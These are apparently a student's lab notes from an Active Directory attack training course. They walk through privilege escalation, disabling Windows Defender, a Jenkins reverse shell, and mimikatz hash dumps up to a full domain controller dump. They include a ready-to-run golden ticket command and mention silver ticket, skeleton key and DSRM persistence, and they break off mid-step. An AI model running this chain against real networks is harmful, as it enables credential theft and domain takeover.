------- Lab assume breach scenario ---------

Start as a low priv user in machine.

1. Priv escalation from user to local admin
(lesson on how to 
-how to use powerview.ps1 and admodule.dll
-enumerate domain, users, shares, acl, domain trusts, and look for juicy info)
-disable antivirus/windows defender to run scripts

Using normal user student133
	-Discover local privesc vulnerabilities and exploit using PowerUp.ps1 (service abuse) to get local admin privileges

2. Pivoting and enumerate
(lesson on how to Invoke remote commands, disable)

using local admin enumerate for other machines with localadmin (can remote using local admin)

Find jenkin with RCE
	- exploit jenkin RCE for reverse shell
			computername: dcrop-ci 
			user: corp/ciadmin

		-> Dump hash using mimikatz
	         * Username : ciadmin
	         * Domain   : dcorp
	         * NTLM     : e08253add90dccf1a208523d02998c3d
	         * SHA1     : f668208e94aec0980d3fd18044e3e64908fe9b03
	         * DPAPI    : 9892675d75e91baace876950ee2fe5e8

3. Escalating to domain admin - look for machines with loggedin domain admin and dump hashes

		-> Invoke-UserHunter to find machines with domain admin logged in and machine also has local admin to be exploited, pivot to it and start dumping hash
			UserName        : svcadmin
			ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
			IPAddress       : 172.16.4.44
			LocalAdmin      : True
		
		-> dump hash using mimikatz
			ciadmin e08253add90dccf1a208523d02998c3d
					-> invoke command at dcorp-mgmt to get domain admin ntlm hash

							Session           : Service from 0
							User Name         : svcadmin
							Domain            : dcorp
							Logon Server      : DCORP-DC
							Logon Time        : 11/16/2020 4:01:42 AM
							SID               : S-1-5-21-1874506631-3219952063-538504511-1122
							        msv :
							         [00000003] Primary
							         * Username : svcadmin
							         * Domain   : dcorp
							         * NTLM     : b38ff50264b74508085d82c69794a4d8
							         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
							         * DPAPI    : fd3c6842994af6bd69814effeedc55d

		-> able to login to adminsrv (local admin). Load mimikatz and dump hash
			         [00000003] Primary
			         * Username : appadmin
			         * Domain   : dcorp
			         * NTLM     : d549831a955fee51a43c83efb3928fa7
			         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
			         * DPAPI    : 7ec84538f109f73066103b9d1629f95e

               		 * Username : DCORP-ADMINSRV$
			         * Domain   : dcorp
			         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
			         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
				    
				     * Username : srvadmin
				     * Domain   : dcorp
			        * NTLM     : a98e18228819e8eec3dfa33cb68b0728
			        * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
			        * DPAPI    : ddce77eab64944efda38b5cfdad5395f

			         * Username : websvc
			         * Domain   : dcorp
			         * NTLM     : cc098f204c5887eaa8253e7c2749156f
			         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
			         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c

4. Start powershell session with domain admin with Domain Admin privileges and start dumping all hashes from domain controller
	-> dump hashes and find krbtgt ntlm hash

					RID  : 000001f4 (500)
					User : Administrator
					LM   :
					NTLM : af0686cc0ca8f04df42210c9ac980760

					RID  : 000001f6 (502)
					User : krbtgt
					LM   :
					NTLM : ff46a9d8bd66c6efd77603da26796f35

					RID  : 00000455 (1109)
					User : ciadmin
					LM   :
					NTLM : e08253add90dccf1a208523d02998c3d

					RID  : 00000458 (1112)
					User : sqladmin
					LM   :
					NTLM : 07e8be316e3da9a042a9cb681df19bf5

					RID  : 00000459 (1113)
					User : websvc
					LM   :
					NTLM : cc098f204c5887eaa8253e7c2749156f

					RID  : 0000045b (1115)
					User : srvadmin
					LM   :
					NTLM : a98e18228819e8eec3dfa33cb68b0728

					RID  : 0000045d (1117)
					User : appadmin
					LM   :
					NTLM : d549831a955fee51a43c83efb3928fa7

					RID  : 00000461 (1121)
					User : mgmtadmin
					LM   :
					NTLM : 95e2cd7ff77379e34c6e46265e75d754

					RID  : 00000462 (1122)
					User : svcadmin
					LM   :
					NTLM : b38ff50264b74508085d82c69794a4d8

					RID  : 0000046b (1131)
					User : studentadmin
					LM   :
					NTLM : d1254f303421d3cdbdc4c73a5bce0201

					RID  : 0000b047 (45127)
					User : Support133user
					LM   :
					NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

					RID  : 0000b053 (45139)
					User : VPN133user
					LM   :
					NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

					RID  : 000003e8 (1000)
					User : DCORP-DC$
					LM   :
					NTLM : 0ffbc912445882bbafe0c66625d5d538

					RID  : 00000456 (1110)
					User : DCORP-CI$
					LM   :
					NTLM : bc7c774ae1c2f9325adee16ff86681fc

					RID  : 00000457 (1111)
					User : DCORP-MSSQL$
					LM   :
					NTLM : 5acf09c93df6805adf482810cc1a38e6

					RID  : 0000045a (1114)
					User : DCORP-ADMINSRV$
					LM   :
					NTLM : 5e77978a734e3a7f3895fb0fdbda3b96

					RID  : 00000468 (1128)
					User : DCORP-APPSRV$
					LM   :
					NTLM : dae2eb887cf962b2907c1273459b58e2

		-> use mimikatz goldenticket attack

			Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'


			-> using mimikatz silver ticket (we need a domain controller hash)
				- Forging HOST and RPCSS ticket to perform RCE using WMI
				- Forging HOST ticket to perform schedule task - getting reverse shell on DC

5. Using admin domain privileges and access to DC

	-> skeleton key attack

	-> DSRM attack
		-> get local hash
			SAMKey : 33e0913ef3886d77d5873060bcea1cfb
			RID  : 000001f4 (500)
			User : Administrator
		  	Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

		 -> 